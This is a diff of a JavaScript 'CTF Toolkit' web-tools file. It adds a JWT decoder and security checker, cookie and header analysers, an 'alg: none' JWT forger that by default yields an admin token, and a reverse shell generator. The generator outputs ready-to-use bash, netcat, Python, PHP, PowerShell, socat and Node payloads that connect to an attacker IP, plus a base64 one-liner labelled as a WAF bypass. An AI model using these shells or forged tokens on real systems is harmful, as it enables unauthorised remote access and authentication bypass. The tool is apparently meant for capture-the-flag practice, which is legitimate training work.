@@ -1,121 +1,214 @@
 // Web tools for CTF Toolkit
 
+// Helper for Base64URL Decoding (RFC 7519)
+function base64UrlDecode(str) {
+    let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
+    while (base64.length % 4 !== 0) {
+        base64 += '=';
+    }
+    const binStr = atob(base64);
+    const bytes = new Uint8Array(binStr.length);
+    for (let i = 0; i < binStr.length; i++) {
+        bytes[i] = binStr.charCodeAt(i);
+    }
+    return new TextDecoder('utf-8').decode(bytes);
+}
+
+// Helper for Base64URL Encoding
+function base64UrlEncode(str) {
+    const bytes = new TextEncoder().encode(str);
+    let binStr = '';
+    for (let i = 0; i < bytes.length; i++) {
+        binStr += String.fromCharCode(bytes[i]);
+    }
+    return btoa(binStr).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+}
+
 // JWT Decoder
 function decodeJWT() {
     const jwtInput = document.getElementById('jwtInput').value.trim();
     
     if (!jwtInput) {
-        alert('Please enter a JWT token');
+        ctfToolkit.showToast('Please enter a JWT token', 'error');
         return;
     }
     
     try {
-        // Split JWT into parts
         const parts = jwtInput.split('.');
         
-        if (parts.length !== 3) {
-            throw new Error('Invalid JWT format. JWT should have 3 parts separated by dots.');
+        if (parts.length < 2 || parts.length > 3) {
+            throw new Error('Invalid JWT format. Expected header.payload.signature.');
         }
         
-        // Decode header and payload
-        const header = JSON.parse(atob(parts[0]));
-        const payload = JSON.parse(atob(parts[1]));
-        const signature = parts[2];
+        const header = JSON.parse(base64UrlDecode(parts[0]));
+        const payload = JSON.parse(base64UrlDecode(parts[1]));
+        const signature = parts[2] || '';
         
-        // Format and display results
         ctfToolkit.formatOutput(document.getElementById('jwtHeader'), JSON.stringify(header, null, 2));
         ctfToolkit.formatOutput(document.getElementById('jwtPayload'), JSON.stringify(payload, null, 2));
-        ctfToolkit.formatOutput(document.getElementById('jwtSignature'), signature);
+        ctfToolkit.formatOutput(document.getElementById('jwtSignature'), signature || '[No signature attached]');
         
         ctfToolkit.toggleOutput('jwtOutputSection', true);
         
-        // Check for common vulnerabilities
+        // Security analysis
         checkJWTVulnerabilities(header, payload);
         
     } catch (error) {
-        alert('Error decoding JWT: ' + error.message);
+        ctfToolkit.showToast('Error decoding JWT: ' + error.message, 'error');
+    }
+}
+
+// Forged "alg: none" JWT Generator
+function forgeJWTNoneAlg() {
+    const headerEl = document.getElementById('jwtHeader');
+    const payloadEl = document.getElementById('jwtPayload');
+    const forgedOutput = document.getElementById('jwtForgedOutput');
+
+    try {
+        let headerObj = {};
+        let payloadObj = {};
+
+        if (headerEl && headerEl.textContent.trim()) {
+            headerObj = JSON.parse(headerEl.textContent);
+        } else {
+            headerObj = { alg: 'none', typ: 'JWT' };
+        }
+
+        if (payloadEl && payloadEl.textContent.trim()) {
+            payloadObj = JSON.parse(payloadEl.textContent);
+        } else {
+            const input = document.getElementById('jwtInput').value.trim();
+            if (input) {
+                const parts = input.split('.');
+                payloadObj = JSON.parse(base64UrlDecode(parts[1]));
+            } else {
+                payloadObj = { user: 'admin', admin: true };
+            }
+        }
+
+        // Set algorithm to 'none'
+        headerObj.alg = 'none';
+
+        const forgedToken = `${base64UrlEncode(JSON.stringify(headerObj))}.${base64UrlEncode(JSON.stringify(payloadObj))}.`;
+        
+        ctfToolkit.formatOutput(forgedOutput, forgedToken);
+        ctfToolkit.toggleOutput('jwtForgedSection', true);
+        ctfToolkit.showToast('Forged alg:none token generated!', 'success');
+    } catch (err) {
+        ctfToolkit.showToast('Failed to forge token: ' + err.message, 'error');
     }
 }
 
 function checkJWTVulnerabilities(header, payload) {
     const warnings = [];
+    const info = [];
     
     // Check for 'none' algorithm
     if (header.alg && header.alg.toLowerCase() === 'none') {
-        warnings.push('⚠️ WARNING: JWT uses "none" algorithm - potentially vulnerable!');
+        warnings.push('⚠️ CRITICAL: JWT uses "none" algorithm. Signature verification can be bypassed.');
     }
     
-    // Check for weak algorithms
+    // Check for HMAC algorithm
     if (header.alg && ['HS256', 'HS384', 'HS512'].includes(header.alg)) {
-        warnings.push('ℹ️ INFO: JWT uses HMAC algorithm - vulnerable to key confusion attacks if RSA is also accepted');
+        info.push('ℹ️ INFO: JWT uses symmetric HMAC algorithm. Weak secrets can be cracked via hashcat or john.');
     }
-    
-    // Check expiration
+
+    // Check for JWK/JKU header injection hints
+    if (header.jwk || header.jku) {
+        warnings.push('⚠️ NOTICE: Token contains "jwk" or "jku" headers. Test for key injection or SSRF.');
+    }
+
+    // Check expiration timestamps
     if (payload.exp) {
         const expDate = new Date(payload.exp * 1000);
         const now = new Date();
         if (expDate < now) {
-            warnings.push('⚠️ WARNING: JWT has expired on ' + expDate.toLocaleString());
+            warnings.push('⚠️ EXPIRED: JWT expired on ' + expDate.toUTCString());
+        } else {
+            info.push('✓ Valid timestamp: Expires ' + expDate.toUTCString());
         }
     }
+
+    if (payload.iat) {
+        const iatDate = new Date(payload.iat * 1000);
+        info.push('ℹ️ Issued At (iat): ' + iatDate.toUTCString());
+    }
     
-    if (warnings.length > 0) {
+    // Remove old warning div if present
+    const existingWarnings = document.querySelector('.jwt-warnings');
+    if (existingWarnings) {
+        existingWarnings.remove();
+    }
+
+    if (warnings.length > 0 || info.length > 0) {
         const warningDiv = document.createElement('div');
         warningDiv.className = 'jwt-warnings';
-        warningDiv.innerHTML = '<h4>Security Analysis:</h4>' + warnings.join('<br>');
+        let html = '<h4>Security & Token Analysis</h4>';
+        if (warnings.length > 0) {
+            html += warnings.join('<br>') + '<br>';
+        }
+        if (info.length > 0) {
+            html += info.join('<br>');
+        }
+        warningDiv.innerHTML = html;
         document.getElementById('jwtOutputSection').appendChild(warningDiv);
     }
 }
 
 // Cookie Parser
 function parseCookies() {
-    const cookieInput = document.getElementById('cookieInput').value.trim();
+    let cookieInput = document.getElementById('cookieInput').value.trim();
     
     if (!cookieInput) {
-        alert('Please enter a cookie string');
+        ctfToolkit.showToast('Please enter a cookie string', 'error');
         return;
     }
     
     try {
+        // Strip leading header keywords if user pasted raw headers
+        cookieInput = cookieInput.replace(/^cookie:\s*/i, '').replace(/^set-cookie:\s*/i, '');
+
         const cookies = {};
         const pairs = cookieInput.split(/;\s*/);
         
         pairs.forEach(pair => {
-            const [name, ...valueParts] = pair.split('=');
-            if (name) {
-                cookies[name.trim()] = valueParts.join('=').trim();
+            const eqIndex = pair.indexOf('=');
+            if (eqIndex > 0) {
+                const name = pair.substring(0, eqIndex).trim();
+                const value = pair.substring(eqIndex + 1).trim();
+                cookies[name] = value;
             }
         });
         
-        // Format output
         let output = 'Parsed Cookies:\n\n';
-        for (const [name, value] of Object.entries(cookies)) {
-            output += `${name}: ${value}\n`;
+        for (const [name, rawValue] of Object.entries(cookies)) {
+            // Trim outer quotes if present
+            const value = rawValue.replace(/^"(.*)"$/, '$1');
+            output += `[Key]:   ${name}\n[Value]: ${value}\n`;
             
-            // Try to decode common encoded values
-            if (value) {
-                // Check if Base64
+            // Try Base64 / Base64URL decode
+            try {
+                if (value.length >= 4 && /^[A-Za-z0-9+/_-]+=*$/.test(value)) {
+                    const decodedB64 = base64UrlDecode(value);
+                    if (isPrintable(decodedB64) && decodedB64 !== value) {
+                        output += `  → Base64 Decoded: ${decodedB64}\n`;
+                    }
+                }
+            } catch (e) {}
+            
+            // Try URL decode
+            if (value.includes('%')) {
                 try {
-                    const decoded = atob(value);
-                    if (isPrintable(decoded)) {
-                        output += `  → Base64 decoded: ${decoded}\n`;
+                    const decodedUrl = decodeURIComponent(value);
+                    if (decodedUrl !== value) {
+                        output += `  → URL Decoded:    ${decodedUrl}\n`;
                     }
                 } catch (e) {}
-                
-                // Check if URL encoded
-                if (value.includes('%')) {
-                    try {
-                        const decoded = decodeURIComponent(value);
-                        if (decoded !== value) {
-                            output += `  → URL decoded: ${decoded}\n`;
-                        }
-                    } catch (e) {}
-                }
             }
             output += '\n';
         }
         
-        ctfToolkit.formatOutput(document.getElementById('cookieOutput'), output);
+        ctfToolkit.formatOutput(document.getElementById('cookieOutput'), output.trim());
         ctfToolkit.toggleOutput('cookieOutputSection', true);
         
     } catch (error) {
@@ -129,59 +222,61 @@ function analyzeHeaders() {
     const headersInput = document.getElementById('headersInput').value.trim();
     
     if (!headersInput) {
-        alert('Please enter HTTP headers');
+        ctfToolkit.showToast('Please enter HTTP headers to analyze', 'error');
         return;
     }
     
     try {
         const headers = {};
         const lines = headersInput.split('\n');
-        let analysis = '';
+        let analysis = 'HTTP Headers Analysis:\n\n';
         
-        // Parse headers
+        // Parse headers and handle duplicates (e.g. Set-Cookie)
         lines.forEach(line => {
             const colonIndex = line.indexOf(':');
             if (colonIndex > 0) {
                 const name = line.substring(0, colonIndex).trim();
                 const value = line.substring(colonIndex + 1).trim();
-                headers[name.toLowerCase()] = { name, value };
+                const lower = name.toLowerCase();
+                if (!headers[lower]) {
+                    headers[lower] = { name, values: [] };
+                }
+                headers[lower].values.push(value);
             }
         });
         
-        analysis += 'Parsed Headers:\n\n';
-        
-        // Display headers with security analysis
-        for (const [key, { name, value }] of Object.entries(headers)) {
-            analysis += `${name}: ${value}\n`;
-            
-            // Security checks
-            const securityNotes = analyzeHeaderSecurity(key, value);
-            if (securityNotes.length > 0) {
-                securityNotes.forEach(note => {
+        // Display headers with security recommendations
+        for (const [key, { name, values }] of Object.entries(headers)) {
+            values.forEach(val => {
+                analysis += `${name}: ${val}\n`;
+                const notes = analyzeHeaderSecurity(key, val);
+                notes.forEach(note => {
                     analysis += `  → ${note}\n`;
                 });
-            }
+            });
             analysis += '\n';
         }
         
         // Check for missing security headers
-        analysis += '\nMissing Security Headers:\n';
-        const securityHeaders = [
-            'x-frame-options',
-            'x-content-type-options',
-            'x-xss-protection',
-            'strict-transport-security',
-            'content-security-policy',
-            'referrer-policy'
+        analysis += 'Security Posture Checks:\n';
+        const essentialSecurityHeaders = [
+            { key: 'strict-transport-security', label: 'Strict-Transport-Security (HSTS)' },
+            { key: 'content-security-policy', label: 'Content-Security-Policy (CSP)' },
+            { key: 'x-frame-options', label: 'X-Frame-Options (Clickjacking)' },
+            { key: 'x-content-type-options', label: 'X-Content-Type-Options (MIME Sniffing)' },
+            { key: 'referrer-policy', label: 'Referrer-Policy' },
+            { key: 'permissions-policy', label: 'Permissions-Policy' }
         ];
         
-        securityHeaders.forEach(header => {
-            if (!headers[header]) {
-                analysis += `⚠️ Missing: ${header}\n`;
+        essentialSecurityHeaders.forEach(sh => {
+            if (!headers[sh.key]) {
+                analysis += `⚠️ Missing: ${sh.label}\n`;
+            } else {
+                analysis += `✓ Present: ${sh.label}\n`;
             }
         });
         
-        ctfToolkit.formatOutput(document.getElementById('headersOutput'), analysis);
+        ctfToolkit.formatOutput(document.getElementById('headersOutput'), analysis.trim());
         ctfToolkit.toggleOutput('headersOutputSection', true);
         
     } catch (error) {
@@ -192,37 +287,40 @@ function analyzeHeaders() {
 
 function analyzeHeaderSecurity(headerName, headerValue) {
     const notes = [];
+    const val = headerValue.toLowerCase();
     
     switch (headerName) {
         case 'server':
-            notes.push(`ℹ️ Server information exposed: ${headerValue}`);
+            notes.push(`Server version exposed: "${headerValue}". Check for known CVEs.`);
             break;
         case 'x-powered-by':
-            notes.push(`⚠️ Technology stack exposed: ${headerValue}`);
+            notes.push(`Technology stack disclosed: "${headerValue}".`);
             break;
         case 'set-cookie':
-            if (!headerValue.toLowerCase().includes('httponly')) {
-                notes.push('⚠️ Cookie missing HttpOnly flag');
+            if (!val.includes('httponly')) {
+                notes.push('⚠️ Missing HttpOnly attribute (cookie readable by JavaScript/XSS)');
             }
-            if (!headerValue.toLowerCase().includes('secure')) {
-                notes.push('⚠️ Cookie missing Secure flag');
+            if (!val.includes('secure')) {
+                notes.push('⚠️ Missing Secure flag (cookie sent over plaintext HTTP)');
             }
-            if (!headerValue.toLowerCase().includes('samesite')) {
-                notes.push('⚠️ Cookie missing SameSite attribute');
+            if (!val.includes('samesite')) {
+                notes.push('⚠️ Missing SameSite attribute (vulnerable to CSRF)');
             }
             break;
         case 'access-control-allow-origin':
             if (headerValue === '*') {
-                notes.push('⚠️ CORS allows all origins (*)');
+                notes.push('⚠️ Permissive CORS: Wildcard origin (*) allowed.');
             }
             break;
         case 'x-frame-options':
-            notes.push(`✓ Clickjacking protection: ${headerValue}`);
+            notes.push(`Frame protection: ${headerValue}`);
             break;
         case 'content-security-policy':
-            notes.push('✓ CSP header present');
-            if (headerValue.includes('unsafe-inline') || headerValue.includes('unsafe-eval')) {
-                notes.push('⚠️ CSP contains unsafe directives');
+            if (val.includes('unsafe-inline')) {
+                notes.push('⚠️ CSP allows unsafe-inline scripts.');
+            }
+            if (val.includes('unsafe-eval')) {
+                notes.push('⚠️ CSP allows unsafe-eval (eval() execution permitted).');
             }
             break;
     }
@@ -230,42 +328,52 @@ function analyzeHeaderSecurity(headerName, headerValue) {
     return notes;
 }
 
+// Reverse Shell Generator
+function generateReverseShell() {
+    const ip = document.getElementById('shellIp').value.trim() || '10.10.14.1';
+    const port = document.getElementById('shellPort').value.trim() || '4444';
+    const shellType = document.getElementById('shellType').value || 'bash';
+
+    let payload = '';
+    switch (shellType) {
+        case 'bash':
+            payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+            break;
+        case 'bash-read':
+            payload = `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`;
+            break;
+        case 'nc-mkfifo':
+            payload = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
+            break;
+        case 'nc-e':
+            payload = `nc -e /bin/bash ${ip} ${port}`;
+            break;
+        case 'python3':
+            payload = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
+            break;
+        case 'php':
+            payload = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
+            break;
+        case 'powershell':
+            payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+            break;
+        case 'socat':
+            payload = `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`;
+            break;
+        case 'node':
+            payload = `node -e 'require("child_process").exec("nc -e /bin/sh ${ip} ${port}")'`;
+            break;
+    }
+
+    const b64 = btoa(payload);
+    const b64Payload = `echo ${b64} | base64 -d | bash`;
+
+    const result = `Raw Payload:\n${payload}\n\nBase64 Encoded One-Liner (WAF Bypass):\n${b64Payload}`;
+    ctfToolkit.formatOutput(document.getElementById('shellOutput'), result);
+    ctfToolkit.toggleOutput('shellOutputSection', true);
+}
+
 // Utility function to check if string contains only printable characters
 function isPrintable(str) {
     return /^[\x20-\x7E\s]*$/.test(str);
 }
-
-// Add styles for JWT warnings
-const style = document.createElement('style');
-style.textContent = `
-    .jwt-parts {
-        display: grid;
-        gap: 1rem;
-    }
-    
-    .jwt-part {
-        background-color: var(--bg-card);
-        padding: 1rem;
-        border-radius: 6px;
-        border: 1px solid var(--border);
-    }
-    
-    .jwt-part h4 {
-        color: var(--accent);
-        margin-bottom: 0.5rem;
-    }
-    
-    .jwt-warnings {
-        margin-top: 1rem;
-        padding: 1rem;
-        background-color: var(--bg-card);
-        border-radius: 6px;
-        border: 1px solid var(--error);
-    }
-    
-    .jwt-warnings h4 {
-        color: var(--error);
-        margin-bottom: 0.5rem;
-    }
-`;
-document.head.appendChild(style);
